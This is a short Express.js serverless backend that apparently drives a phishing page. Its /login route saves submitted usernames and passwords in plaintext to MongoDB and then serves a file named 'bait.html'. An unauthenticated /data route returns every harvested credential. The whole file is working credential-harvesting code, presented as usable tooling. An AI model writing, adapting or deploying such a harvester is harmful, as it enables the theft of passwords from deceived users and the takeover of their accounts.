const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const serverless = require('serverless-http');
const port = 3000;
const router = express.Router();
require('../database');
const Data = require('../database/schema/data');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, '../static')));

router.get('/', async (req, res) => {
    await res.sendFile('index.html');
});

router.post('/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        if (!username || !password) throw new Error('Missing Credentials');
        await Data.create({ username, password });
        await res.sendFile(path.join(__dirname, '../static/bait.html'));
    } catch (error) {
        console.log(error);
    }

});

router.get('/data', async (req, res) => {
    const userDataDB = await Data.find();
    res.json(userDataDB);
});

app.use('/', router);

// app.listen(port, () => {
//     console.log(`Live at http://localhost:${port}`);
// });
module.exports.handler = serverless(app);